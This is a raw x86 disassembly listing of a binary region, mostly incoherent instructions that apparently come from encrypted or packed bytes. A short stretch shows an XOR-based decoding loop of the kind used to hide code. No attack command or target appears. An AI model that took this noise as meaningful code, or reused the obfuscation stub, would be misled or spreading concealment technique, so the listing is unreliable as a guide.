  403a42:	adc    ebp,DWORD PTR [ebp-0x1b]
  403a45:	dec    edi
  403a46:	xor    al,0x25
  403a48:	xor    al,0x4f
  403a4a:	pushf  
  403a4b:	mov    ds:0x8a9ae8a5,eax
  403a50:	jo     0x403a7a
  403a52:	pop    ebp
  403a53:	inc    di
  403a55:	push   edx
  403a56:	xor    DWORD PTR [ebx+0x46],esi
  403a59:	xor    ebx,DWORD PTR [ebp+0x47]
  403a5c:	dec    ebp
  403a5d:	mov    WORD PTR [ebp-0x98bc833],ss
  403a63:	lahf   
  403a64:	hlt    
  403a65:	retf   
  403a66:	pop    es
  403a67:	ins    BYTE PTR es:[edi],dx
  403a68:	ss push es
  403a6a:	mov    al,0x66
  403a6c:	push   ebp
  403a6d:	jne    0x403ac2
  403a6f:	sbb    eax,ecx
  403a71:	cwde   
  403a72:	fild   WORD PTR ds:0x100ddd41
  403a78:	fucompp 
  403a7a:	sahf   
  403a7b:	test   BYTE PTR [ebx+0x4c],cl
  403a7e:	or     al,0x2f
  403a80:	in     eax,dx
  403a81:	bound  ebp,QWORD PTR [ecx+0x20d1c41f]
  403a87:	rol    BYTE PTR [esi+0x26],1
  403a8a:	push   eax
  403a8b:	mov    al,ds:0xf4bf5057
  403a90:	mov    ebx,0xbf975eb8
  403a95:	in     al,dx
  403a96:	outs   dx,DWORD PTR ds:[esi]
  403a97:	cld    
  403a98:	cdq    
  403a99:	dec    esp
  403a9a:	fadd   DWORD PTR [ecx+0x1f0e698b]
  403aa0:	inc    esp
  403aa1:	hlt    
  403aa2:	es adc al,dh
  403aa5:	sub    al,0x83
  403aa7:	dec    ebp
  403aa8:	or     al,0x64
  403aaa:	mov    esp,0xdb43c721
  403aaf:	lods   eax,DWORD PTR ds:[esi]
  403ab0:	sahf   
  403ab1:	retf   0x636e
  403ab4:	stos   BYTE PTR es:[edi],al
  403ab5:	sub    di,di
  403ab8:	jge    0x403a5e
  403aba:	fild   DWORD PTR [eax-0x6313a1c9]
  403ac0:	lds    esp,FWORD PTR [edi]
  403ac2:	int    0x6f
  403ac4:	sar    DWORD PTR [ecx],1
  403ac6:	add    BYTE PTR [edx-0x60c19588],0x5d
  403acd:	pusha  
  403ace:	push   ecx
  403acf:	jae    0x403b2e
  403ad1:	ss inc esi
  403ad3:	inc    esp
  403ad4:	lahf   
  403ad5:	imul   ebp,DWORD PTR [eax],0xffffff84
  403ad8:	sbb    dl,0xaa
  403adb:	add    DWORD PTR [ecx-0x47],ecx
  403ade:	stc    
  403adf:	or     eax,0x73463259
  403ae4:	(bad)  
  403ae5:	xchg   ebx,eax
  403ae6:	inc    ebx
  403ae7:	jge    0x403ac8
  403ae9:	fcom   DWORD PTR [ebp-0x7f51ea93]
  403aef:	jne    0x403b3a
  403af1:	retf   
  403af2:	fwait
  403af3:	mov    ds:0xed7a30d5,al
  403af8:	icebp  
  403af9:	xor    BYTE PTR [ebx+0x51],0xa0
  403afd:	xor    cx,WORD PTR [ebx]
  403b00:	or     al,BYTE PTR [eax-0x1a]
  403b03:	idiv   DWORD PTR [ebp+ecx*4-0x10]
  403b07:	cmp    al,0xd7
  403b09:	ins    BYTE PTR es:[edi],dx
  403b0a:	lods   eax,DWORD PTR ds:[esi]
  403b0b:	loope  0x403b1a
  403b0d:	mov    esp,0xafd8b666
  403b12:	push   0xeb19d960
  403b17:	jmp    0x714798c3
  403b1c:	push   esi
  403b1d:	pop    edi
  403b1e:	push   ds
  403b1f:	xor    edx,DWORD PTR [esi+0x513cb208]
  403b25:	push   ecx
  403b26:	fwait
  403b27:	mov    ebp,0x7c2bc266
  403b2c:	ret    
  403b2d:	retf   
  403b2e:	push   esp
  403b2f:	fdivp  st(7),st
  403b31:	mov    DWORD PTR [ecx-0x59961a04],0xa5d2a56f
  403b3b:	fcomp  DWORD PTR [edx-0x62]
  403b3e:	push   edx
  403b3f:	mov    WORD PTR [ebx],ss
  403b41:	cld    
  403b42:	sub    eax,0x4181fbd1
  403b47:	imul   edi,DWORD PTR [esp+eax*1+0x4b],0xffffffb8
  403b4c:	(bad)  
  403b4d:	std    
  403b4e:	loop   0x403b44
  403b50:	mov    ebx,0xfe5531ce
  403b55:	or     DWORD PTR [edx],0xcbd456ec
  403b5b:	je     0x403bc8
  403b5d:	je     0x403b89
  403b5f:	inc    edx
  403b60:	xchg   edx,eax
  403b61:	pop    esp
  403b62:	ret    
  403b63:	sbb    esp,DWORD PTR [edx]
  403b65:	xor    ecx,0xa4c505d3
  403b6b:	mov    bh,0x33
  403b6d:	ss fxch st(6)
  403b70:	call   0x4c326cb7
  403b75:	pop    ss
  403b76:	jo     0x403b45
  403b78:	nop
  403b79:	inc    esi
  403b7a:	test   edx,edi
  403b7c:	mov    ebp,0x22146d9b
  403b81:	in     al,0xd8
  403b83:	adc    BYTE PTR [ebp+0x381bbee9],dl
  403b89:	cwde   
  403b8a:	push   0xf1fd0049
  403b8f:	push   eax
  403b90:	push   cs
  403b91:	not    edx
  403b93:	out    0x3a,eax
  403b95:	or     esp,ebp
  403b97:	fcmovnu st,st(6)
  403b99:	push   0xe645a78c
  403b9e:	inc    esi
  403b9f:	bound  ebp,QWORD PTR [ebx]
  403ba1:	aad    0x61
  403ba3:	sub    BYTE PTR ds:0xd59590c6,cl
  403ba9:	daa    
  403baa:	inc    eax
  403bab:	sbb    DWORD PTR [edx],edx
  403bad:	cmp    cl,bl
  403baf:	mov    edi,0xcccec14a
  403bb4:	adc    eax,0x67715224
  403bb9:	fs repnz cwde 
  403bbc:	add    ch,cl
  403bbe:	ss out 0x36,al
  403bc1:	mov    ch,0x8c
  403bc3:	sbb    DWORD PTR ds:0x11d6ffd3,ebp
  403bc9:	aam    0x56
  403bcb:	pop    ds
  403bcc:	in     al,dx
  403bcd:	inc    eax
  403bce:	repz xor edx,DWORD PTR cs:[edx+0x32]
  403bd3:	pop    esi
  403bd4:	and    esi,edi
  403bd6:	push   esp
  403bd7:	bound  esp,QWORD PTR [ebx+0x7ca99f1e]
  403bdd:	sbb    ebp,esi
  403bdf:	add    eax,0x8e663bbe
  403be4:	test   eax,0xf9b7604e
  403be9:	cmp    dl,ah
  403beb:	jns    0x403c28
  403bed:	dec    edx
  403bee:	xchg   ebx,eax
  403bef:	mov    DWORD PTR [ecx-0x22fb891e],esi
  403bf5:	icebp  
  403bf6:	retf   0xf39d
  403bf9:	mov    dl,0x6e
  403bfb:	or     edi,DWORD PTR [ebx-0x5c]
  403bfe:	pop    esi
  403bff:	mov    al,0xec
  403c01:	mov    ds:0x9028d10e,eax
  403c06:	pop    es
  403c07:	test   DWORD PTR ds:0x5bd2b1c2,esi
  403c0d:	pop    es
  403c0e:	push   edi
  403c0f:	es test eax,0x8aa65b1b
  403c15:	mov    dh,0xb6
  403c17:	inc    esi
  403c18:	ins    DWORD PTR es:[edi],dx
  403c19:	pop    eax
  403c1a:	and    esi,DWORD PTR [edx-0x2d]
  403c1d:	push   edx
  403c1e:	popf   
  403c1f:	pop    ebx
  403c20:	add    dl,ah
  403c22:	push   ecx
  403c23:	pop    ebx
  403c24:	sub    eax,0x1b930310
  403c29:	push   ss
  403c2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c2b:	fadd   DWORD PTR [esi]
  403c2d:	push   0xffffff84
  403c2f:	push   0x8b3438c2
  403c34:	jae    0x403bdd
  403c36:	push   eax
  403c37:	loopne 0x403bc3
  403c39:	aad    0x3f
  403c3b:	and    BYTE PTR [ebx+edx*1-0x67e7bc3a],dl
  403c42:	stos   BYTE PTR es:[edi],al
  403c43:	popf   
  403c44:	ror    BYTE PTR [edx+esi*8],cl
  403c47:	add    DWORD PTR ds:0xeb616110,esp
  403c4d:	test   al,0x73
  403c4f:	jnp    0x403c3c
  403c51:	push   es
  403c52:	enter  0x388d,0x91
  403c56:	sub    DWORD PTR [ebp-0x3a01e9d0],0x47
  403c5d:	inc    eax
  403c5e:	mov    ds:0xac469f82,al
  403c63:	jmp    0x3a451634
  403c68:	cdq    
  403c69:	mov    WORD PTR [edi+0x23],gs
  403c6c:	pop    ds
  403c6d:	rdpmc  
  403c6f:	fidivr DWORD PTR [edx+ecx*4]
  403c72:	inc    esp
  403c73:	jg     0x403c7b
  403c75:	jns    0x403c8f
  403c77:	xchg   ebx,eax
  403c78:	repz test al,0xb9
  403c7b:	inc    esp
  403c7c:	pop    edi
  403c7d:	or     esp,ebx
  403c7f:	adc    BYTE PTR [eax+0x110da0d3],ch
  403c85:	out    0xfb,eax
  403c87:	or     eax,0x18212a3b
  403c8c:	jb     0x403c56
  403c8e:	dec    esp
  403c8f:	xchg   esp,eax
  403c90:	mov    bh,0x34
  403c92:	add    ah,BYTE PTR [esi+0x76017274]
  403c98:	xchg   BYTE PTR [edx],ah
  403c9a:	push   edx
  403c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c9c:	xchg   ebp,eax
  403c9d:	pop    ebp
  403c9e:	data16 lods al,BYTE PTR ds:[esi]
  403ca0:	inc    ebx
  403ca1:	add    ax,di
  403ca4:	movzx  eax,ax
  403ca7:	mov    DWORD PTR [ebp-0x14],eax
  403caa:	mov    eax,DWORD PTR [ebp+0x8]
  403cad:	movzx  eax,WORD PTR [eax+edx*4]
  403cb1:	xor    eax,0x8a38
  403cb6:	add    eax,edi
  403cb8:	mov    edi,DWORD PTR [ebp-0x14]
  403cbb:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403cbf:	mov    eax,DWORD PTR [ebp-0xc]
  403cc2:	inc    edx
  403cc3:	cmp    edx,eax
  403cc5:	jne    0x40389a
  403ccb:	pop    edi
  403ccc:	pop    ebx
  403ccd:	mov    eax,DWORD PTR [ebp-0x8]
  403cd0:	mov    edx,DWORD PTR [ebp+0x10]
  403cd3:	xor    eax,ecx
  403cd5:	add    eax,esi
  403cd7:	mov    DWORD PTR [edx],eax
  403cd9:	jmp    0x4040ce
  403cde:	mov    ch,0xd5
  403ce0:	or     dh,al
  403ce2:	push   0xfffffff1
  403ce4:	jge    0x403d43
  403ce6:	inc    eax
  403ce7:	xchg   ecx,eax
  403ce8:	add    esp,0xbe3848f9
  403cee:	mov    ebx,0x567e7e1f
  403cf3:	jns    0x403d73
  403cf5:	jle    0x403cb4
  403cf7:	test   al,0xb2
  403cf9:	sub    al,0x1e
  403cfb:	test   al,0xa4
  403cfd:	retf   0x1de5
  403d00:	int    0x90
  403d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d03:	jnp    0x403cc3
  403d05:	add    eax,0xadeaf6c
  403d0a:	ss in  eax,dx
  403d0c:	jp     0x403cfd
  403d0e:	fnstsw WORD PTR [ecx]
  403d10:	(bad)  
  403d11:	in     eax,dx
  403d12:	sbb    ebp,esi
  403d14:	inc    edx
  403d15:	sar    DWORD PTR [edi],1
  403d17:	cmp    DWORD PTR [ebx+0x1f],edx
  403d1a:	leave  
  403d1b:	xchg   esp,eax
  403d1c:	call   0x891dc89c
  403d21:	or     ch,BYTE PTR [ecx+0x66]
  403d24:	fldl2t 
  403d26:	addr16 call 0x7fd3:0x758933b2
  403d2e:	lods   al,BYTE PTR ds:[esi]
  403d2f:	pop    ss
  403d30:	cmp    al,0x26
  403d32:	loope  0x403db1
  403d34:	fcmovu st,st(5)
  403d36:	xor    ah,ch
  403d38:	xlat   BYTE PTR ds:[ebx]
  403d39:	xchg   ecx,eax
  403d3a:	aad    0xcf
  403d3c:	sbb    BYTE PTR [esi-0x994d554],bh
  403d42:	mov    eax,0x999a3f2
  403d47:	mov    ebp,0xeb356e69
  403d4c:	adc    edi,DWORD PTR [edi-0x4c2f619d]
  403d52:	jno    0x403cd9
  403d54:	sar    ch,0x2e
  403d57:	push   edi
  403d58:	fwait
  403d59:	retf   0x8732
  403d5c:	fmulp  st(0),st
  403d5e:	fsub   QWORD PTR [ecx+0x5479c83e]
  403d64:	icebp  
  403d65:	outs   dx,BYTE PTR ds:[esi]
  403d66:	stos   BYTE PTR es:[edi],al
  403d67:	pop    esi
  403d68:	cmp    bh,BYTE PTR [esi]
  403d6a:	jle    0x403d4f
  403d6c:	and    eax,0x49c3adce
  403d71:	jae    0x403d5d
  403d73:	cli    
  403d74:	or     al,0xc
  403d76:	jmp    0x403d71
  403d78:	cmp    ebp,DWORD PTR [ebp+0x41]
  403d7b:	jns    0x403dee
  403d7d:	idiv   BYTE PTR [esp+edx*4]
  403d80:	inc    esp
  403d81:	inc    edx
  403d82:	pop    edx
  403d83:	add    edx,ebx
  403d85:	test   al,0x11
  403d87:	push   edi
  403d88:	mov    al,ds:0xdcb3ea61
  403d8d:	jl     0x403d27
  403d8f:	mov    dl,0x8b
  403d91:	add    esi,eax
  403d93:	in     al,0xdb
  403d95:	xchg   esi,eax
  403d96:	sbb    dl,BYTE PTR [edx+0x2e]
  403d99:	dec    edx
  403d9a:	sti    
  403d9b:	xchg   ecx,eax
  403d9c:	test   eax,0xbfb479ed
  403da1:	sbb    al,0x6a
  403da3:	aam    0x88
  403da5:	int3   
  403da6:	not    BYTE PTR [ebx+0x1bf75236]
  403dac:	jmp    0x403da0
  403dae:	sbb    DWORD PTR [ebx],ebp
  403db0:	cdq    
  403db1:	inc    esi
  403db2:	cmc    
  403db3:	mov    bx,0xd47c
  403db7:	and    dh,BYTE PTR [eax+0x74]
  403dba:	xor    eax,0x336a8bcf
  403dbf:	dec    esp
  403dc0:	imul   eax,ebp,0x22
  403dc3:	push   cs
  403dc4:	enter  0x5f7e,0x10
  403dc8:	ficomp DWORD PTR [esi+0xa]
  403dcb:	repnz sub BYTE PTR [ecx],0xe1
  403dcf:	(bad)  
  403dd0:	dec    ebx
  403dd1:	int3   
  403dd2:	leave  
  403dd3:	jge    0x403deb
  403dd5:	sbb    BYTE PTR [esi+0x185c322a],ah
  403ddb:	ror    BYTE PTR [edi-0x43],1
  403dde:	dec    edx
  403ddf:	dec    ebp
  403de0:	imul   esp,edi,0x7614d916
  403de6:	sbb    bh,cl
  403de8:	pushf  
  403de9:	dec    esp
  403dea:	test   BYTE PTR [edi+0x6f],0x9c
  403dee:	inc    esi
  403def:	icebp  
  403df0:	xchg   edx,eax
  403df1:	sub    eax,0xd8efce0f
  403df6:	push   ss
  403df7:	inc    eax
  403df8:	fs call 0x69a9:0xf70538dc
  403e00:	ins    DWORD PTR es:[edi],dx
  403e01:	lea    edi,[ecx-0x6c]
  403e04:	pop    eax
  403e05:	retf   
  403e06:	xchg   edx,eax
  403e07:	push   ss
  403e08:	pop    ss
  403e09:	pop    ss
  403e0a:	mov    bh,0xa7
  403e0c:	xor    ebp,DWORD PTR [ebp+0x1d]
  403e0f:	mov    ch,0xa
  403e11:	repnz and BYTE PTR [edi-0x407203de],0x50
  403e19:	retf   
  403e1a:	xor    dl,bl
  403e1c:	inc    ebx
  403e1d:	cli    
  403e1e:	xlat   BYTE PTR ds:[ebx]
  403e1f:	jo     0x403e4c
  403e21:	dec    eax
  403e22:	dec    eax
  403e23:	jo     0x403db0
  403e25:	dec    esp
  403e26:	clc    
  403e27:	aad    0x2a
  403e29:	and    al,0x60
  403e2b:	dec    edi
  403e2c:	sub    edx,ecx
  403e2e:	jbe    0x403de1
  403e30:	and    BYTE PTR [esi-0x40939d40],ah
  403e36:	jno    0x403dfd
  403e38:	xchg   ebx,eax
  403e39:	pop    edi
  403e3a:	rol    BYTE PTR [ebp-0x4a2b3cf5],0xbf
  403e41:	pop    ebx
  403e42:	sbb    BYTE PTR [edi-0x61],0xa2
  403e46:	xchg   esp,eax
  403e47:	stc    
  403e48:	push   cs
  403e49:	push   ss
  403e4a:	jg     0x403e4a
  403e4c:	fisttp WORD PTR [ebx]
  403e4e:	adc    cl,ch
  403e50:	fadd   QWORD PTR [edx+0x1b]
  403e53:	cwde   
  403e54:	cmp    al,0x61
  403e56:	popf   
  403e57:	push   ebp
  403e58:	mov    edi,0xaeabdb30
  403e5d:	jne    0x403e27
  403e5f:	icebp  
  403e60:	std    
  403e61:	cmp    BYTE PTR [ebp-0x1e],dl
  403e64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e65:	push   ds
  403e66:	sbb    esi,DWORD PTR [esi]
  403e68:	inc    DWORD PTR [edx+0x4]
  403e6b:	mul    BYTE PTR [ebx+0x2f]
  403e6e:	xchg   DWORD PTR [ebp+0x1e5815d0],eax
  403e74:	or     BYTE PTR [edi],ch
  403e76:	and    bh,bl
  403e78:	fcomi  st,st(7)
  403e7a:	int    0x86
  403e7c:	dec    ecx
  403e7d:	out    dx,al
  403e7e:	out    0x48,al
  403e80:	inc    edi
  403e81:	mov    ah,BYTE PTR [esi+0x2613113f]
  403e87:	xchg   ebx,eax
  403e88:	call   0x3fee:0xd045d484
  403e8f:	es inc eax
  403e91:	xchg   DWORD PTR [edi-0x12],ebx
  403e94:	test   al,0x68
  403e96:	enter  0xe806,0xf0
  403e9a:	pop    ebp
  403e9b:	sub    eax,0x64618212
  403ea0:	(bad)  
  403ea1:	cmp    BYTE PTR [ebx-0x22],dh
  403ea4:	out    dx,al
  403ea5:	test   al,0x96
  403ea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ea8:	out    0xa0,al
  403eaa:	(bad)  
  403eab:	and    bl,ch
  403ead:	lds    eax,FWORD PTR [ebp+0x70]
  403eb0:	jne    0x403f0a
  403eb2:	ins    BYTE PTR es:[edi],dx
  403eb3:	scas   al,BYTE PTR es:[edi]
  403eb4:	rol    cl,0x68
  403eb7:	cmp    al,0xc
  403eb9:	sbb    eax,0x514c208c
  403ebe:	inc    ecx
  403ebf:	push   ss
  403ec0:	xor    edx,DWORD PTR [ecx+0xa4bf12d]
  403ec6:	inc    esi
  403ec7:	and    BYTE PTR [edx],bl
  403ec9:	stc    
  403eca:	scas   eax,DWORD PTR es:[edi]
  403ecb:	in     al,dx
  403ecc:	mov    ecx,0xc0e3034a
  403ed1:	adc    BYTE PTR [ecx-0x6ebf8ac9],cl
  403ed7:	xor    BYTE PTR [ebx-0x433f9590],dl
  403edd:	(bad)  
  403ede:	and    DWORD PTR [edi-0x5c],ecx
  403ee1:	in     eax,0xa8
  403ee3:	push   0x2604512e
  403ee8:	fdivr  DWORD PTR [edx]
  403eea:	mov    BYTE PTR [eax-0x60],ch
  403eed:	jo     0x403f39
  403eef:	lods   al,BYTE PTR ds:[esi]
  403ef0:	into   
  403ef1:	add    BYTE PTR [esi],ch
  403ef3:	or     BYTE PTR [ebp-0x59856eec],dh
  403ef9:	xor    eax,0x260fd20d
  403efe:	and    DWORD PTR [ebx+0x10],ebx
  403f01:	retf   
  403f02:	lods   al,BYTE PTR ds:[esi]
  403f03:	out    dx,al
  403f04:	cmp    al,0x47
  403f06:	cmp    eax,0x35f00d1b
  403f0b:	or     al,0xbd
  403f0d:	jle    0x403f19
  403f0f:	(bad)  
  403f10:	cmp    al,0xb9
  403f12:	cmc    
  403f13:	pushf  
  403f14:	fiadd  DWORD PTR [ebx]
  403f16:	xchg   edi,eax
  403f17:	ja     0x403e9d
  403f19:	in     eax,0x3b
  403f1b:	rcr    esp,cl
  403f1d:	inc    eax
  403f1e:	sub    al,0x32
  403f20:	test   eax,0x92772a51
  403f25:	into   
  403f26:	retf   
  403f27:	and    BYTE PTR [edx],bl
  403f29:	leave  
  403f2a:	sti    
  403f2b:	adc    eax,0x1ea25528
  403f30:	push   ds
  403f31:	or     ah,BYTE PTR [ecx]
  403f33:	jmp    0x31ef:0x5976d7b9
  403f3a:	xchg   esi,eax
  403f3b:	xchg   ebx,eax
  403f3c:	mov    eax,ds:0xec19f0db
  403f41:	adc    al,0xb2
  403f43:	shl    DWORD PTR [edi+0x48],cl
  403f46:	cmc    
  403f47:	mov    ebx,edi
  403f49:	xor    BYTE PTR [esp+ebp*2],al
  403f4c:	jmp    0x403f1f
  403f4e:	and    eax,0xbe6d0ee3
  403f53:	gs add eax,0x2069633c
  403f59:	push   ds
  403f5a:	mov    ebx,0x8fd9702a
  403f5f:	in     al,0x8e
  403f61:	gs aad 0xf1
  403f64:	in     al,0x65
  403f66:	jae    0x403eff
  403f68:	pop    edx
  403f69:	in     eax,dx
  403f6a:	aas    
  403f6b:	adc    ah,ah
  403f6d:	xchg   ebp,eax
  403f6e:	clc    
  403f6f:	cli    
  403f70:	add    BYTE PTR [esi],bl
  403f72:	push   cs
  403f73:	push   ebx
  403f74:	aas    
  403f75:	mov    BYTE PTR [ebp+0x770e0fd9],ch
  403f7b:	pop    DWORD PTR [ebp+ebp*1-0x24]
  403f7f:	test   al,0x18
  403f81:	pushf  
  403f82:	jae    0x403f07
  403f84:	stc    
  403f85:	mov    eax,ds:0x90cb87e2
  403f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f8b:	mov    ecx,0xf1a23d1d
  403f90:	gs das 
  403f92:	cmc    
  403f93:	dec    esp
  403f94:	mov    ah,0xe5
  403f96:	add    BYTE PTR [ebp-0x107fc01a],ch
  403f9c:	imul   edi,DWORD PTR [ebp-0x3c],0x60
  403fa0:	and    DWORD PTR [edx],edx
  403fa2:	outs   dx,BYTE PTR ds:[esi]
  403fa3:	or     al,BYTE PTR ds:0x49a04d41
  403fa9:	and    DWORD PTR [edx],ebx
  403fab:	scas   al,BYTE PTR es:[edi]
  403fac:	ss int 0x37
  403faf:	popa   
  403fb0:	or     bl,BYTE PTR [esi+0x67]
  403fb3:	les    edx,FWORD PTR [edi]
  403fb5:	jp     0x404024
  403fb7:	std    
  403fb8:	adc    bl,BYTE PTR [edi]
  403fba:	popf   
  403fbb:	pop    eax
  403fbc:	cld    
  403fbd:	dec    esi
  403fbe:	ins    BYTE PTR es:[edi],dx
  403fbf:	out    dx,al
  403fc0:	push   esi
  403fc1:	test   DWORD PTR [eax+0x2281179e],0xc68c178d
  403fcb:	into   
  403fcc:	es hlt 
  403fce:	and    eax,edi
  403fd0:	jns    0x403fa5
  403fd2:	mov    al,dl
  403fd4:	inc    eax
  403fd5:	daa    
  403fd6:	into   
  403fd7:	push   esp
  403fd8:	or     bh,BYTE PTR [edi-0x5c9a3e50]
  403fde:	mov    cl,0xda
  403fe0:	pop    ebx
  403fe1:	shl    BYTE PTR [esi+0x7b],cl
  403fe4:	mov    ds:0xcd60a101,eax
  403fe9:	fist   WORD PTR [eax]
  403feb:	int3   
  403fec:	lock stc 
  403fee:	jne    0x404063
  403ff0:	mov    ah,0x49
  403ff2:	imul   ecx,DWORD PTR [eax-0x72],0x4dfe1b4d
  403ff9:	pop    edx
  403ffa:	inc    ebx
  403ffb:	fldenv ds:0x59025bbc
  404001:	push   0x8eba546c
  404006:	sahf   
  404007:	mov    edx,0xa5256e0e
  40400c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40400d:	fstp   TBYTE PTR [ebx-0x5d4b7afe]
  404013:	sbb    DWORD PTR [edi-0x3e],ebp
  404016:	std    
  404017:	dec    esi
  404018:	push   eax
  404019:	hlt    
  40401a:	pop    ss
  40401b:	push   ds
  40401c:	movsx  esp,BYTE PTR [edi+0x49519557]
  404023:	fld    TBYTE PTR [ecx]
  404025:	xchg   esi,eax
  404026:	jle    0x404097
  404028:	xchg   ebx,eax
  404029:	mov    bh,0xb4
  40402b:	mov    eax,ds:0x567e7c77
  404030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404031:	jmp    0x34ee803b
  404036:	mov    dl,0xa1
  404038:	mov    ah,0x8e
  40403a:	mov    al,ds:0xe767346
  40403f:	push   ebx
  404040:	gs inc ecx
  404042:	fstp   TBYTE PTR ds:0x980079e4
  404048:	ins    DWORD PTR es:[edi],dx
  404049:	jg     0x40400b
  40404b:	mov    esi,edi
  40404d:	enter  0x4b7b,0xfc
  404051:	add    eax,0x9a540b67
  404056:	fistp  DWORD PTR [ecx+0x55]
  404059:	in     eax,0xc1
  40405b:	mov    edx,0xc03677f5
  404060:	pop    edx
  404061:	mov    DWORD PTR [edi+ecx*1-0x20],ecx
  404065:	push   0x8ae27c4d
  40406a:	ins    DWORD PTR es:[edi],dx
  40406b:	push   ebp
  40406c:	xor    DWORD PTR [ecx*2+0x1f7dab27],eax
  404073:	adc    esi,esp
  404075:	leave  
  404076:	(bad)  
  404077:	jo     0x4040b1
  404079:	and    edi,DWORD PTR [ecx+ecx*1]
  40407c:	call   0x375102c5
  404081:	xlat   BYTE PTR ds:[ebx]
  404082:	int3   
  404083:	or     ch,BYTE PTR [eax-0x20e818ae]
  404089:	sub    al,0xa9
  40408b:	xchg   DWORD PTR [edi-0x54],esi
  40408e:	ret    0x99d5
  404091:	mov    edi,DWORD PTR [ebp-0xc512da2]
  404097:	into   
  404098:	loope  0x4040c0
  40409a:	add    BYTE PTR [edi-0x22e61481],dl
  4040a0:	pop    eax
  4040a1:	adc    ecx,0xfffffff4
  4040a4:	test   BYTE PTR [eax],cl
  4040a6:	ficom  DWORD PTR [edx-0x480a213b]
  4040ac:	mov    eax,ds:0xe30f25bb
  4040b1:	in     al,dx
  4040b2:	sbb    edx,ecx
  4040b4:	mov    ebp,0x6ce652c4
  4040b9:	stos   DWORD PTR es:[edi],eax
  4040ba:	mov    bh,0x2d
  4040bc:	das    
  4040bd:	ins    DWORD PTR es:[edi],dx
  4040be:	mov    al,ds:0x3af28b36
  4040c3:	sub    BYTE PTR [ecx+0x3c],bl
  4040c6:	in     al,0x9b
  4040c8:	call   0x6438482b
  4040cd:	jb     0x40405a
  4040cf:	inc    ebp
  4040d0:	clc    
  4040d1:	xor    eax,ecx
  4040d3:	add    eax,esi
  4040d5:	mov    DWORD PTR [ebp+0x8],eax
  4040d8:	mov    eax,DWORD PTR [ebp+0x8]
  4040db:	jmp    0x4044d0
  4040e0:	pop    edx
  4040e1:	ret    0x1375
  4040e4:	jge    0x4040a3
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	jae    0x404096
  4040e9:	test   BYTE PTR [eax+0x58960bcd],ah
  4040ef:	and    DWORD PTR [ebx+0x567e7e1b],edx
  4040f5:	jns    0x404175
  4040f7:	jle    0x404101
  4040f9:	or     al,0x3e
  4040fb:	sbb    DWORD PTR [ebx],ebx
  4040fd:	adc    bh,BYTE PTR [ebx+0x10a6bff4]
  404103:	mov    esi,0x7a7de49b
  404108:	dec    ebp
  404109:	sbb    ah,BYTE PTR [ecx+0x57ffc9ba]
  40410f:	mov    ds:0x5582588d,al
  404114:	sbb    esp,DWORD PTR [ebx+0x1d]
  404117:	shr    DWORD PTR [edx],1
  404119:	push   edx
  40411a:	and    DWORD PTR [edx],eax
  40411c:	loopne 0x40416e
  40411e:	mov    bh,0x9e
  404120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404121:	lahf   
  404122:	mov    edx,0xaa44b173
  404127:	mov    ds:0x16dc0c4c,eax
  40412c:	push   es
  40412d:	mov    edi,0x1408b02f
  404132:	pandn  mm7,mm7
  404135:	xchg   edi,eax
  404136:	lds    esp,FWORD PTR [esi-0x43]
  404139:	gs add al,0xbc
  40413c:	adc    bh,BYTE PTR [esi+eax*1]
  40413f:	in     al,dx
  404140:	jns    0x404114
  404142:	mov    cl,BYTE PTR [ecx]
  404144:	pop    esp
  404145:	adc    al,0x78
  404147:	mov    eax,ds:0xc85520e
  40414c:	ds mov ebp,0xe5d312d4
  404152:	mov    ds:0x81c85182,eax
  404157:	aas    
  404158:	retf   0x4e31
  40415b:	jmp    0x8024:0xbc4f93d
  404162:	ds (bad) 
  404164:	or     edi,DWORD PTR [ebp-0x2ab7032e]
  40416a:	or     DWORD PTR ds:0x9014eeb1,ebx
  404170:	test   eax,0xbc84ecc2
  404175:	cvtps2pi mm2,xmm0
  404178:	push   ebx
  404179:	fadd   DWORD PTR [esi+0x24]
  40417c:	fcomp  QWORD PTR [eax+edx*4-0x4]
  404180:	std    
  404181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404182:	jmp    0x3eef:0x24fc7510
  404189:	inc    esp
  40418a:	mov    ds,WORD PTR [ebx-0x160b9455]
  404190:	xor    al,0xc9
  404192:	ror    DWORD PTR [ebx+0x1c],0xb1
  404196:	sbb    DWORD PTR ds:[edi],esp
  404199:	aas    
  40419a:	sbb    al,0x85
  40419c:	push   esp
  40419d:	adc    al,0x79
  40419f:	ins    BYTE PTR es:[edi],dx
  4041a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041a1:	push   cs
  4041a2:	adc    eax,0x839890ff
  4041a7:	jno    0x404208
  4041a9:	cmp    bh,BYTE PTR [esi+0x7cee3850]
  4041af:	ret    0x31ae
  4041b2:	fst    QWORD PTR [eax+0x1a]
  4041b5:	jbe    0x404166
  4041b7:	or     esi,esp
  4041b9:	shr    DWORD PTR [eax+0xb],1
  4041bc:	clc    
  4041bd:	pop    ebx
  4041be:	and    al,cl
  4041c0:	jle    0x4041e0
  4041c2:	cmp    DWORD PTR [esi+0x6],ebp
  4041c5:	mov    bh,BYTE PTR [ebx+0x36]
  4041c8:	arpl   WORD PTR ds:0x4f1cfd69,ax
  4041ce:	or     ah,BYTE PTR [eax+0x4f]
  4041d1:	and    ah,BYTE PTR [edx]
  4041d3:	iret   
  4041d4:	aas    
  4041d5:	pop    ecx
  4041d6:	ficomp WORD PTR [edx+0x6ad32ff5]
  4041dc:	fwait
  4041dd:	jmp    0x44a9:0x349ce9d2
  4041e4:	ror    DWORD PTR [edx-0x6fa91a44],0xdd
  4041eb:	ficomp WORD PTR [edx+eiz*1-0x4d]
  4041ef:	jbe    0x4041d3
  4041f1:	sbb    al,dl
  4041f3:	mov    eax,0xb3cff35d
  4041f8:	addr16 retf 
  4041fa:	add    edx,DWORD PTR [edx+0x4e]
  4041fd:	(bad)  
  4041fe:	push   ebp
  4041ff:	cmp    cl,BYTE PTR [esi-0x19]
